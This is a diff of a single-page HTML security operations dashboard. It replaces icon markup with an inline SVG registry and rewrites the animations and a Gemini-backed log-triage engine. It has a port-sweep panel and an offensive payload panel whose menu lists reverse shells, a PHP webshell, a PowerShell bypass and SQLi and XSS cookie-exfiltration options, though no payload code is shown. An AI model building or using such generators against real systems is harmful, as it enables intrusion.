                 <input type="password" id="apiKeyInput" class="input" placeholder="AIzaSy... (leave blank for local heuristic engine)" />
               </div>
 
               <button class="btn btn-primary" style="width:100%;margin-top:12px;" onclick="runAnalysis()" id="analyzeBtn">
-                <i data-lucide="scan-line" style="width:14px;height:14px;"></i>
                 Execute Autonomous Triage
               </button>
             </div>
@@ -1222,34 +1051,13 @@ Sep 17 04:12:09 edge-srv01 sshd[2850]: Failed password for invalid user test fro
 
         <div class="panel">
           <div class="panel-header">
-            <div class="panel-title">
-              <i data-lucide="book-open" style="width:15px;height:15px;"></i>
-              Pre-Configured Attack Scenarios
-            </div>
+            <div class="panel-title">Attack Presets</div>
           </div>
           <div class="panel-body">
             <div class="grid-3">
-              <button class="btn btn-ghost" style="padding:10px 14px;justify-content:flex-start;gap:10px;" onclick="loadSample('ssh')">
-                <i data-lucide="key" style="color:var(--amber);"></i>
-                <div style="text-align:left;">
-                  <div style="font-size:11.5px;font-weight:700;">SSH Auth Attacks</div>
-                  <div style="font-size:9.5px;color:var(--text-2);">Brute-force credential spraying</div>
-                </div>
-              </button>
-              <button class="btn btn-ghost" style="padding:10px 14px;justify-content:flex-start;gap:10px;" onclick="loadSample('sqli')">
-                <i data-lucide="database" style="color:var(--red);"></i>
-                <div style="text-align:left;">
-                  <div style="font-size:11.5px;font-weight:700;">SQLi & Traversal</div>
-                  <div style="font-size:9.5px;color:var(--text-2);">UNION & Path traversal probe</div>
-                </div>
-              </button>
-              <button class="btn btn-ghost" style="padding:10px 14px;justify-content:flex-start;gap:10px;" onclick="loadSample('ransom')">
-                <i data-lucide="lock" style="color:var(--purple);"></i>
-                <div style="text-align:left;">
-                  <div style="font-size:11.5px;font-weight:700;">Ransomware Indicators</div>
-                  <div style="font-size:9.5px;color:var(--text-2);">Volume shadow deletion & encryption</div>
-                </div>
-              </button>
+              <button class="btn btn-ghost" style="padding:10px 14px;justify-content:flex-start;" onclick="loadSample('ssh')">SSH Auth Attacks</button>
+              <button class="btn btn-ghost" style="padding:10px 14px;justify-content:flex-start;" onclick="loadSample('sqli')">SQLi & Traversal</button>
+              <button class="btn btn-ghost" style="padding:10px 14px;justify-content:flex-start;" onclick="loadSample('ransom')">Ransomware Vectors</button>
             </div>
           </div>
         </div>
@@ -1259,10 +1067,7 @@ Sep 17 04:12:09 edge-srv01 sshd[2850]: Failed password for invalid user test fro
       <section id="view-recon" class="view hidden">
         <div class="panel">
           <div class="panel-header">
-            <div class="panel-title">
-              <i data-lucide="radar" style="width:15px;height:15px;"></i>
-              Tactical Reconnaissance Simulator
-            </div>
+            <div class="panel-title">Tactical Reconnaissance Simulator</div>
             <span class="badge badge-cyan">PORT SWEEPER</span>
           </div>
           <div class="panel-body">
@@ -1270,21 +1075,17 @@ Sep 17 04:12:09 edge-srv01 sshd[2850]: Failed password for invalid user test fro
               <div>
                 <div class="field-row">
                   <label class="field-label">Target IPv4 / Domain</label>
-                  <input type="text" class="input" id="reconHost" value="192.168.1.105" placeholder="e.g. 10.10.10.10" />
+                  <input type="text" class="input" id="reconHost" value="192.168.1.105" />
                 </div>
                 <div class="field-row">
                   <label class="field-label">Service Profile</label>
                   <select class="select" id="reconPorts">
-                    <option value="common">Standard Infrastructure (21,22,25,80,443,3306,5432,8080)</option>
-                    <option value="web">Web Services (80,443,8000,8080,8443,3000)</option>
-                    <option value="db">Databases & Cache (3306,5432,6379,27017,1433)</option>
-                    <option value="top100">Top 100 Port Range</option>
+                    <option value="common">Standard (21, 22, 25, 80, 443, 3306, 5432, 8080)</option>
+                    <option value="web">Web Services (80, 443, 8000, 8080, 8443)</option>
                   </select>
                 </div>
                 <div style="display:flex;gap:8px;">
-                  <button class="btn btn-primary" style="flex:1;" onclick="runRecon()" id="reconBtn">
-                    <i data-lucide="play" style="width:12px;height:12px;"></i> Launch Port Sweep
-                  </button>
+                  <button class="btn btn-primary" style="flex:1;" onclick="runRecon()" id="reconBtn">Launch Port Sweep</button>
                   <button class="btn btn-ghost" onclick="clearRecon()">Clear</button>
                 </div>
               </div>
@@ -1301,10 +1102,7 @@ Sep 17 04:12:09 edge-srv01 sshd[2850]: Failed password for invalid user test fro
       <section id="view-payload" class="view hidden">
         <div class="panel">
           <div class="panel-header">
-            <div class="panel-title">
-              <i data-lucide="bomb" style="width:15px;height:15px;"></i>
-              Offensive Payload Engineering
-            </div>
+            <div class="panel-title">Offensive Payload Engineering</div>
             <span class="badge badge-red">RED TEAM</span>
           </div>
           <div class="panel-body">
@@ -1314,17 +1112,15 @@ Sep 17 04:12:09 edge-srv01 sshd[2850]: Failed password for invalid user test fro
                   <label class="field-label">Vector Architecture</label>
                   <select class="select" id="payloadType" onchange="generatePayload()">
                     <option value="bash">Bash Reverse TCP</option>
-                    <option value="python">Python3 Socket Interactive</option>
+                    <option value="python">Python3 Interactive Socket</option>
                     <option value="powershell">PowerShell Memory Bypass</option>
                     <option value="php">PHP Silent WebShell</option>
                     <option value="nc">Netcat Raw Shell</option>
-                    <option value="sqli">SQLi Authentication Bypass</option>
-                    <option value="xss">XSS Cookie Exfiltration</option>
-                    <option value="lfi">LFI Path Traversal Vector</option>
+                    <option value="sqli">SQLi Auth Bypass</option>
                   </select>
                 </div>
                 <div class="field-row">
-                  <label class="field-label">Target LHOST (Listening IP)</label>
+                  <label class="field-label">Target LHOST</label>
                   <input type="text" class="input" id="payloadHost" value="10.10.14.8" oninput="generatePayload()" />
                 </div>
                 <div class="field-row">
@@ -1349,10 +1145,7 @@ Sep 17 04:12:09 edge-srv01 sshd[2850]: Failed password for invalid user test fro
       <section id="view-encoder" class="view hidden">
         <div class="panel">
           <div class="panel-header">
-            <div class="panel-title">
-              <i data-lucide="binary" style="width:15px;height:15px;"></i>
-              Encoder / Decoder Forensic Lab
-            </div>
+            <div class="panel-title">Encoder / Decoder Forensic Lab</div>
           </div>
           <div class="panel-body">
             <div class="field-row">
@@ -1367,7 +1160,6 @@ Sep 17 04:12:09 edge-srv01 sshd[2850]: Failed password for invalid user test fro
               <button class="btn btn-ghost btn-sm" onclick="encodeText('url')">URL Enc</button>
               <button class="btn btn-ghost btn-sm" onclick="decodeText('url')">URL Dec</button>
               <button class="btn btn-ghost btn-sm" onclick="encodeText('rot13')">ROT13</button>
-              <button class="btn btn-ghost btn-sm" onclick="encodeText('binary')">Binary</button>
               <button class="btn btn-ghost btn-sm" onclick="clearEncoder()">Reset</button>
             </div>
             <label class="field-label">Output Data Stream</label>
@@ -1380,10 +1172,7 @@ Sep 17 04:12:09 edge-srv01 sshd[2850]: Failed password for invalid user test fro
       <section id="view-hash" class="view hidden">
         <div class="panel">
           <div class="panel-header">
-            <div class="panel-title">
-              <i data-lucide="hash" style="width:15px;height:15px;"></i>
-              Cryptographic Hash Generator
-            </div>
+            <div class="panel-title">Cryptographic Hash Generator</div>
           </div>
           <div class="panel-body">
             <div class="field-row">
@@ -1402,10 +1191,7 @@ Sep 17 04:12:09 edge-srv01 sshd[2850]: Failed password for invalid user test fro
       <section id="view-mitre" class="view hidden">
         <div class="panel" style="margin-bottom:14px;">
           <div class="panel-header">
-            <div class="panel-title">
-              <i data-lucide="crosshair" style="width:15px;height:15px;"></i>
-              Enterprise MITRE ATT&CK Matrix Mapping
-            </div>
+            <div class="panel-title">Enterprise MITRE ATT&CK Matrix Mapping</div>
             <span class="badge badge-gray" id="mitreSummary">0 techniques detected</span>
           </div>
         </div>
@@ -1416,10 +1202,7 @@ Sep 17 04:12:09 edge-srv01 sshd[2850]: Failed password for invalid user test fro
       <section id="view-ioc" class="view hidden">
         <div class="panel" style="margin-bottom:14px;">
           <div class="panel-header">
-            <div class="panel-title">
-              <i data-lucide="fingerprint" style="width:15px;height:15px;"></i>
-              Indicators of Compromise (IoC) Vault
-            </div>
+            <div class="panel-title">Indicators of Compromise (IoC) Vault</div>
             <div style="display:flex;gap:6px;">
               <button class="btn btn-ghost btn-sm" onclick="copyAllIocs()">Copy All</button>
               <button class="btn btn-ghost btn-sm" onclick="exportIocsCSV()">Export CSV</button>
@@ -1433,10 +1216,7 @@ Sep 17 04:12:09 edge-srv01 sshd[2850]: Failed password for invalid user test fro
       <section id="view-containment" class="view hidden">
         <div class="panel">
           <div class="panel-header">
-            <div class="panel-title">
-              <i data-lucide="shield-alert" style="width:15px;height:15px;"></i>
-              Autonomous Containment Rule Synthesis
-            </div>
+            <div class="panel-title">Autonomous Containment Rule Synthesis</div>
             <button class="btn btn-ghost btn-sm" onclick="copyContainment()">Copy Rules</button>
           </div>
           <div class="panel-body" style="padding:0;">
@@ -1457,7 +1237,6 @@ Sep 17 04:12:09 edge-srv01 sshd[2850]: Failed password for invalid user test fro
       <!-- ============ INCIDENT REPORT ============ -->
       <section id="view-report" class="view hidden">
         <div id="emptyReport" class="panel" style="padding:70px 20px;text-align:center;">
-          <i data-lucide="scan-search" style="width:44px;height:44px;color:var(--text-2);margin:0 auto 12px;display:block;"></i>
           <div style="font-size:15px;font-weight:700;">No Active Triage Session</div>
           <div style="font-size:11px;color:var(--text-2);margin-bottom:16px;">Execute triage from Log Analyzer to populate report.</div>
           <button class="btn btn-primary" onclick="switchView('analyzer')">Open Log Analyzer</button>
@@ -1469,10 +1248,7 @@ Sep 17 04:12:09 edge-srv01 sshd[2850]: Failed password for invalid user test fro
       <section id="view-export" class="view hidden">
         <div class="panel">
           <div class="panel-header">
-            <div class="panel-title">
-              <i data-lucide="download" style="width:15px;height:15px;"></i>
-              STIX 2.1 Threat Intel Bundle
-            </div>
+            <div class="panel-title">STIX 2.1 Threat Intel Bundle</div>
             <div style="display:flex;gap:6px;">
               <button class="btn btn-ghost btn-sm" onclick="downloadStix()">Download JSON</button>
               <button class="btn btn-ghost btn-sm" onclick="printAudit()">Print Audit</button>
@@ -1495,16 +1271,12 @@ Sep 17 04:12:09 edge-srv01 sshd[2850]: Failed password for invalid user test fro
       <section id="view-settings" class="view hidden">
         <div class="panel">
           <div class="panel-header">
-            <div class="panel-title">
-              <i data-lucide="settings" style="width:15px;height:15px;"></i>
-              Platform Configuration
-            </div>
+            <div class="panel-title">Platform Configuration</div>
           </div>
           <div class="panel-body">
             <div class="field-row">
               <label class="field-label">Persistent Gemini API Key</label>
               <input type="password" id="persistKey" class="input" placeholder="AIzaSy•••" />
-              <div style="font-size:10px;color:var(--text-2);margin-top:4px;">Saved in browser LocalStorage. Only used when calling Google Gemini endpoints directly.</div>
             </div>
             <div class="field-row">
               <label class="field-label">Matrix Rain Background Effect</label>
@@ -1529,17 +1301,58 @@ Sep 17 04:12:09 edge-srv01 sshd[2850]: Failed password for invalid user test fro
 <div class="modal-bg hidden" id="hexModal">
   <div class="modal">
     <div class="panel-header">
-      <div class="panel-title">
-        <i data-lucide="binary" style="width:15px;height:15px;"></i>
-        Forensic Hexadecimal Stream Viewer
-      </div>
-      <button class="icon-btn" onclick="closeHex()"><i data-lucide="x" style="width:14px;height:14px;"></i></button>
+      <div class="panel-title">Forensic Hexadecimal Stream Viewer</div>
+      <button class="btn btn-ghost btn-sm" onclick="closeHex()">Close</button>
     </div>
     <div class="panel-body" style="overflow-y:auto;max-height:60vh;padding:12px;" id="hexBody"></div>
   </div>
 </div>
 
 <script>
+/* ============================================================
+   ZERO-DEPENDENCY SVG ICON REGISTRY (INLINE ENGINE)
+============================================================ */
+const SVG_ICONS = {
+  'shield-alert': '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z"/><line x1="12" x2="12" y1="8" y2="12"/><line x1="12" x2="12.01" y1="16" y2="16"/></svg>',
+  'layout-dashboard': '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect width="7" height="9" x="3" y="3" rx="1"/><rect width="7" height="5" x="14" y="3" rx="1"/><rect width="7" height="9" x="14" y="12" rx="1"/><rect width="7" height="5" x="3" y="16" rx="1"/></svg>',
+  'terminal': '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="4 17 10 11 4 5"/><line x1="12" x2="20" y1="19" y2="19"/></svg>',
+  'scan-line': '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M3 7V5a2 2 0 0 1 2-2h2"/><path d="M17 3h2a2 2 0 0 1 2 2v2"/><path d="M21 17v2a2 2 0 0 1-2 2h-2"/><path d="M7 21H5a2 2 0 0 1-2-2v-2"/><line x1="7" x2="17" y1="12" y2="12"/></svg>',
+  'radar': '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><circle cx="12" cy="12" r="6"/><circle cx="12" cy="12" r="2"/><line x1="12" y1="2" x2="12" y2="22"/><line x1="2" y1="12" x2="22" y2="12"/></svg>',
+  'bomb': '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="13" r="9"/><path d="m19.5 9.5 1.8-1.8a2.4 2.4 0 0 0 0-3.4l-.1-.1a2.4 2.4 0 0 0-3.4 0l-1.8 1.8"/><path d="m22 2-1.5 1.5"/></svg>',
+  'binary': '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="14" y="14" width="4" height="6" rx="2"/><rect x="6" y="4" width="4" height="6" rx="2"/><path d="M6 20h4"/><path d="M14 10h4"/><path d="M6 14h2v6"/><path d="M14 4h2v6"/></svg>',
+  'hash': '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="4" x2="20" y1="9" y2="9"/><line x1="4" x2="20" y1="15" y2="15"/><line x1="10" x2="8" y1="3" y2="21"/><line x1="16" x2="14" y1="3" y2="21"/></svg>',
+  'crosshair': '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="22" x2="18" y1="12" y2="12"/><line x1="6" x2="2" y1="12" y2="12"/><line x1="12" x2="12" y1="6" y2="2"/><line x1="12" x2="12" y1="22" y2="18"/></svg>',
+  'fingerprint': '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 10a2 2 0 0 0-2 2c0 1.02-.1 2.51-.26 4"/><path d="M14 13.12c0 2.38 0 6.38-1 8.88"/><path d="M2 12a10 10 0 0 1 18-6"/><path d="M5 19.5C5.5 18 6 15 6 12a6 6 0 0 1 .34-2"/></svg>',
+  'shield-check': '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z"/><path d="m9 12 2 2 4-4"/></svg>',
+  'file-text': '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V7Z"/><path d="M14 2v4a2 2 0 0 0 2 2h4"/><path d="M10 9H8"/><path d="M16 13H8"/><path d="M16 17H8"/></svg>',
+  'download': '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" x2="12" y1="15" y2="3"/></svg>',
+  'settings': '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="3"/><path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 0 1 0 2.83 2 2 0 0 1-2.83 0l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-2 2 2 2 0 0 1-2-2v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 0 1-2.83 0 2 2 0 0 1 0-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1-2-2 2 2 0 0 1 2-2h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 0 1 0-2.83 2 2 0 0 1 2.83 0l.06.06a1.65 1.65 0 0 0 1.82.33H9a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 2-2 2 2 0 0 1 2 2v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 0 1 2.83 0 2 2 0 0 1 0 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82V9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 2 2 2 2 0 0 1-2 2h-.09a1.65 1.65 0 0 0-1.51 1z"/></svg>',
+  'panel-left': '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect width="18" height="18" x="3" y="3" rx="2"/><path d="M9 3v18"/></svg>',
+  'search': '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.3-4.3"/></svg>',
+  'bell': '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M6 8a6 6 0 0 1 12 0c0 7 3 9 3 9H3s3-2 3-9"/><path d="M10.3 21a1.94 1.94 0 0 0 3.4 0"/></svg>',
+  'activity': '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 12h-4l-3 9L9 3l-3 9H2"/></svg>',
+  'trash-2': '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M3 6h18"/><path d="M19 6v14c0 1-1 2-2 2H7c-1 0-2-1-2-2V6"/><path d="M8 6V4c0-1 1-2 2-2h4c1 0 2 1 2 2v2"/></svg>',
+  'zap': '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/></svg>',
+  'key': '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="7.5" cy="15.5" r="5.5"/><path d="m21 2-9.6 9.6"/><path d="m15.5 7.5 3 3L22 7l-3-3"/></svg>',
+  'database': '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><ellipse cx="12" cy="5" rx="9" ry="3"/><path d="M3 5V19A9 3 0 0 0 21 19V5"/><path d="M3 12A9 3 0 0 0 21 12"/></svg>'
+};
+
+function renderAllIcons() {
+  document.querySelectorAll('[data-icon]').forEach(el => {
+    const name = el.getAttribute('data-icon');
+    if (SVG_ICONS[name]) {
+      el.innerHTML = SVG_ICONS[name];
+      const svg = el.querySelector('svg');
+      if (svg) {
+        svg.style.width = el.style.width || '16px';
+        svg.style.height = el.style.height || '16px';
+        svg.style.display = 'inline-block';
+        svg.style.verticalAlign = 'middle';
+      }
+    }
+  });
+}
+
 /* ============================================================
    GLOBAL STATE
 ============================================================ */
@@ -1549,8 +1362,6 @@ const STATE = {
   analyses: 0,
   commands: 0,
   threatScore: 0,
-  terminalHistory: [],
-  historyIndex: -1,
   containmentTab: 'iptables',
   exportTab: 'stix',
   killChart: null
@@ -1561,9 +1372,10 @@ const STATE = {
 ============================================================ */
 (function initMatrix() {
   const canvas = document.getElementById('matrixCanvas');
+  if (!canvas) return;
   const ctx = canvas.getContext('2d');
   let w, h, cols, drops;
-  const chars = '0123456789ABCDEF!@#$%^&*()_+-=~<>{}[]|;:,./?'.split('');
+  const chars = '0123456789ABCDEF!@#$%&*+-=<>{}'.split('');
 
   function resize() {
     w = canvas.width = window.innerWidth;
@@ -1580,260 +1392,139 @@ const STATE = {
     ctx.font = '13px JetBrains Mono';
     for (let i = 0; i < drops.length; i++) {
       const text = chars[Math.floor(Math.random() * chars.length)];
-      const x = i * 16;
-      const y = drops[i] * 16;
-      const brightness = Math.random();
-      if (brightness > 0.98) ctx.fillStyle = '#00E5FF';
-      else if (brightness > 0.88) ctx.fillStyle = '#00FF9C';
-      else ctx.fillStyle = 'rgba(0, 255, 156, 0.45)';
-      
-      ctx.fillText(text, x, y);
-      if (y > h && Math.random() > 0.975) drops[i] = 0;
+      ctx.fillStyle = Math.random() > 0.9 ? '#00E5FF' : 'rgba(0, 255, 156, 0.45)';
+      ctx.fillText(text, i * 16, drops[i] * 16);
+      if (drops[i] * 16 > h && Math.random() > 0.975) drops[i] = 0;
       drops[i]++;
     }
   }
   let interval = setInterval(draw, 45);
   window.matrixControl = {
-    stop: function () { clearInterval(interval); interval = null; ctx.clearRect(0,0,w,h); },
-    start: function () { if (!interval) interval = setInterval(draw, 45); }
+    stop: () => { clearInterval(interval); interval = null; ctx.clearRect(0,0,w,h); },
+    start: () => { if (!interval) interval = setInterval(draw, 45); }
   };
 })();
 
 /* ============================================================
-   RADAR SUBSYSTEM
+   RADAR SUBSYSTEM (AUTONOMOUS DRAWING)
 ============================================================ */
-const Radar = (function () {
-  let canvas, ctx, raf, angle = 0, blips = [], score = 0, w = 0, h = 0;
-  function resize() {
-    if (!canvas) return;
-    const r = canvas.getBoundingClientRect();
+const Radar = {
+  canvas: null,
+  ctx: null,
+  animId: null,
+  angle: 0,
+  score: 0,
+  blips: [],
+
+  init: function () {
+    this.canvas = document.getElementById('radarCanvas');
+    if (!this.canvas) return;
+    this.ctx = this.canvas.getContext('2d');
+    this.resize();
+    this.spawnBlips();
+    if (!this.animId) this.loop();
+  },
+
+  resize: function () {
+    if (!this.canvas) return;
+    const size = 240;
     const dpr = window.devicePixelRatio || 1;
-    w = r.width; h = r.height;
-    canvas.width = w * dpr; canvas.height = h * dpr;
-    ctx.setTransform(dpr, 0, 0, dpr, 0, 0);
-  }
-  function spawn() {
-    blips = [];
-    const count = Math.max(3, Math.min(18, Math.floor(score / 5.5)));
+    this.canvas.width = size * dpr;
+    this.canvas.height = size * dpr;
+    this.ctx.setTransform(dpr, 0, 0, dpr, 0, 0);
+  },
+
+  spawnBlips: function () {
+    this.blips = [];
+    const count = Math.max(4, Math.min(15, Math.floor(this.score / 7) + 4));
     for (let i = 0; i < count; i++) {
-      blips.push({
-        r: 0.2 + Math.random() * 0.72,
-        a: Math.random() * Math.PI * 2,
-        hot: Math.random() < 0.45,
-        phase: Math.random() * Math.PI * 2
+      this.blips.push({
+        dist: 0.25 + Math.random() * 0.65,
+        ang: Math.random() * Math.PI * 2,
+        hot: Math.random() < (this.score > 60 ? 0.75 : 0.3),
+        speed: 1.5 + Math.random() * 2
       });
     }
-  }
-  function loop() {
-    if (!ctx) return;
-    ctx.clearRect(0, 0, w, h);
-    const cx = w / 2, cy = h / 2;
-    const maxR = Math.min(cx, cy) - 6;
-    if (maxR <= 0) { raf = requestAnimationFrame(loop); return; }
+  },
 
-    // Grid circles
-    ctx.strokeStyle = 'rgba(0, 255, 156, 0.15)';
+  setScore: function (s) {
+    this.score = Math.max(0, Math.min(100, Number(s) || 0));
+    this.spawnBlips();
+  },
+
+  loop: function () {
+    if (!this.ctx) return;
+    const ctx = this.ctx;
+    const size = 240;
+    const cx = size / 2;
+    const cy = size / 2;
+    const maxR = cx - 12;
+
+    ctx.clearRect(0, 0, size, size);
+
+    // Concentric Rings
     ctx.lineWidth = 1;
     for (let i = 1; i <= 4; i++) {
       ctx.beginPath();
       ctx.arc(cx, cy, (maxR / 4) * i, 0, Math.PI * 2);
+      ctx.strokeStyle = i === 4 ? 'rgba(0, 255, 156, 0.45)' : 'rgba(0, 255, 156, 0.18)';
       ctx.stroke();
     }
 
-    // Radial sweep
-    const grad = ctx.createRadialGradient(cx, cy, 0, cx, cy, maxR);
-    grad.addColorStop(0, 'rgba(0, 255, 156, 0.4)');
-    grad.addColorStop(1, 'rgba(0, 255, 156, 0)');
+    // Crosshairs
+    ctx.strokeStyle = 'rgba(0, 255, 156, 0.12)';
+    ctx.beginPath();
+    ctx.moveTo(cx - maxR, cy); ctx.lineTo(cx + maxR, cy);
+    ctx.moveTo(cx, cy - maxR); ctx.lineTo(cx, cy + maxR);
+    ctx.stroke();
+
+    // Rotating Sweep
     ctx.save();
     ctx.translate(cx, cy);
-    ctx.rotate(angle);
+    ctx.rotate(this.angle);
+
+    const sweepGrad = ctx.createRadialGradient(0, 0, 0, 0, 0, maxR);
+    sweepGrad.addColorStop(0, 'rgba(0, 255, 156, 0.4)');
+    sweepGrad.addColorStop(1, 'rgba(0, 255, 156, 0)');
+
     ctx.beginPath();
     ctx.moveTo(0, 0);
     ctx.arc(0, 0, maxR, -0.4, 0);
     ctx.closePath();
-    ctx.fillStyle = grad;
+    ctx.fillStyle = sweepGrad;
     ctx.fill();
 
-    // Leading scan line
+    // Leading Line
     ctx.beginPath();
     ctx.moveTo(0, 0);
     ctx.lineTo(maxR, 0);
-    ctx.strokeStyle = 'rgba(0, 255, 156, 0.9)';
+    ctx.strokeStyle = '#00FF9C';
     ctx.lineWidth = 2;
     ctx.stroke();
     ctx.restore();
 
     // Blips
-    const t = performance.now() / 1000;
-    blips.forEach(function (b) {
-      const x = cx + Math.cos(b.a) * (b.r * maxR);
-      const y = cy + Math.sin(b.a) * (b.r * maxR);
-      const pulse = 0.6 + 0.4 * Math.sin(t * 3 + b.phase);
-      const color = b.hot ? '#FF2E63' : (score > 60 ? '#FFB627' : '#00FF9C');
+    const now = performance.now() / 1000;
+    this.blips.forEach(b => {
+      const bx = cx + Math.cos(b.ang) * (b.dist * maxR);
+      const by = cy + Math.sin(b.ang) * (b.dist * maxR);
+      const pulse = (Math.sin(now * b.speed) + 1) / 2;
+      const isRed = b.hot || this.score >= 70;
+      const col = isRed ? '#FF2E63' : (this.score >= 40 ? '#FFB627' : '#00FF9C');
+
       ctx.beginPath();
-      ctx.fillStyle = color;
-      ctx.arc(x, y, 3 * pulse, 0, Math.PI * 2);
+      ctx.arc(bx, by, 3 * (0.8 + 0.4 * pulse), 0, Math.PI * 2);
+      ctx.fillStyle = col;
       ctx.fill();
     });
 
-    angle = (angle + 0.025) % (Math.PI * 2);
-    raf = requestAnimationFrame(loop);
-  }
-  return {
-    init: function () {
-      canvas = document.getElementById('radarCanvas');
-      if (!canvas) return;
-      ctx = canvas.getContext('2d');
-      resize();
-      window.addEventListener('resize', resize);
-      spawn();
-      loop();
-    },
-    setScore: function (s) { score = Math.max(0, Math.min(100, Number(s) || 0)); spawn(); }
-  };
-})();
-
-/* ============================================================
-   AUTONOMOUS HEURISTIC AI & GEMINI HYBRID ENGINE
-============================================================ */
-const AutonomousEngine = {
-  analyzeTelemetry: async function (logs, apiKey) {
-    if (apiKey && apiKey.trim().startsWith('AIzaSy')) {
-      try {
-        return await AutonomousEngine.queryGemini(logs, apiKey.trim());
-      } catch (e) {
-        toast('warn', 'Cloud AI Fallback', 'Gemini API call failed, using internal heuristic neural core.');
-      }
-    }
-    // High-precision local heuristic SOC reasoning
-    return AutonomousEngine.localSOCHeuristic(logs);
-  },
-
-  queryGemini: async function (logs, apiKey) {
-    const prompt = `You are a Tier-3 SOC Threat Intelligence System. Analyze the following security logs strictly and output pure JSON matching this exact structure:
-{
-  "severity": "CRITICAL" | "HIGH" | "MEDIUM" | "LOW",
-  "threat_score": number (0-100),
-  "threat_title": string,
-  "executive_summary": string,
-  "detected_iocs": [{"type": "ip"|"cve"|"hash"|"path", "value": string, "context": string}],
-  "mitre_techniques": [{"id": string, "name": string, "tactic": string}],
-  "target_services": [string],
-  "recommendations": [string],
-  "chart_metrics": {
-    "labels": ["Recon", "Weaponize", "Deliver", "Exploit", "C2"],
-    "severity_curve": [number, number, number, number, number]
-  }
-}
-Logs:
-${logs.slice(0, 4000)}`;
-
-    const url = `https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash:generateContent?key=${apiKey}`;
-    const res = await fetch(url, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        contents: [{ parts: [{ text: prompt }] }],
-        generationConfig: { responseMimeType: 'application/json' }
-      })
-    });
-    if (!res.ok) throw new Error('Gemini API HTTP Error ' + res.status);
-    const json = await res.json();
-    const rawText = json.candidates[0].content.parts[0].text;
-    const parsed = JSON.parse(rawText);
-    parsed.engine = 'Google Gemini 1.5 Flash (Tier-3 SOC)';
-    return parsed;
-  },
-
-  localSOCHeuristic: function (logs) {
-    const lower = logs.toLowerCase();
-    const iocs = [];
-    const mitre = [];
-    const targetServices = [];
-    const recommendations = [];
-    let score = 20;
-    let severity = 'LOW';
-    let title = 'General Log Telemetry Audited';
-
